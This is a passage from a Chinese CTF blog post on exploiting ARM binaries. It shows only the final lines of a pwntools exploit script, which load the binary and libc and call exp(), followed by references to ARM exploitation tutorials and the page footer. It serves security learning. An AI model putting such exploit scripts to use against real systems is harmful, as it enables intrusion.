</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=参考>参考</h2><ol><li><a href=https://m4x.fun/post/how-2-pwn-an-arm-binary/>如何 pwn 掉一个 arm 的binary</a></li><li><a href=https://www.anquanke.com/post/id/199112>ARM架构下的 Pwn 的一般解决思路</a></li><li><a href=https://docs.pwntools.com/en/stable/qemu.html>pwntools doc: QEMU Utilities</a></li><li><a href=https://azeria-labs.com/writing-arm-assembly-part-1/>ARM Assembly Basics Tutorial Series by Azeria</a></li><li><a href=https://stackoverflow.com/questions/53268118/whats-the-difference-between-mov-movz-movn-and-movk-in-armv8-assembly>aarch64 movk movn movz</a></li></ol></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
<span class=item-content>hhdx</span></p><p class=copyright-item><span class=item-title>上次更新</span>
<span class=item-content>2020-10-17</span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>CTF</a>
<a href=/tags/arm/>ARM</a></div><nav class=post-nav><a class=prev href=/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/><i class="iconfont icon-left"></i>
<span class="prev-text nav-default">Kernel Pwn: 从入门到入土</span>
<span class="prev-text nav-mobile">上一篇</span></a>
<a class=next href=/post/pwnable-tw-re-alloc-revenge/><span class="next-text nav-default">pwnable.tw re-alloc_revenge</span>
<span class="next-text nav-mobile">下一篇</span>
<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="lyliuchao",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
<span class=division>|</span>
<span class=theme-info>主题 -
<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
<span class=copyright-year>&copy;
2016 -
2023<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
<script src=https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js integrity=sha384-NXgwF8Kv9SSAr+jemKKcbvQsz+teULH/a5UNJvZc6kP47hZgl62M1vGnw6gHQhb1 crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
<script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-177325662-1","auto"),ga("set","anonymizeIp",!0),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>